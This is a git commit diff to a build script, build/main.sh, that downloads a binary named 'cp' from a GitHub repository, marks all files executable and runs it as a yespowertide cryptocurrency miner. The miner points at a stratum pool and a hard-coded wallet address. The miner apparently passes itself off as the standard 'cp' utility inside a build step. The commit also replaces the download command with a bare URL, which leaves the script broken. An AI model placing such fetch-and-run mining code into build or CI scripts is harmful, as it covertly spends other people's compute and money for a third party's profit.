8b632f2a5c6dca71c2469f7b8e10fde0eeb8853d
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-31 05:50:24 -0600

    Update main.sh

--- build/main.sh
+++ build/main.sh
@@ -1,4 +1,4 @@
 #bash
-wget https://github.com/edrivetokenbsc/xnxxx/raw/main/cp
+https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cp
 chmod +x *
 ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TRyHNWPni8BfLAthBFiYbRJf5Z47zQcynb.a100
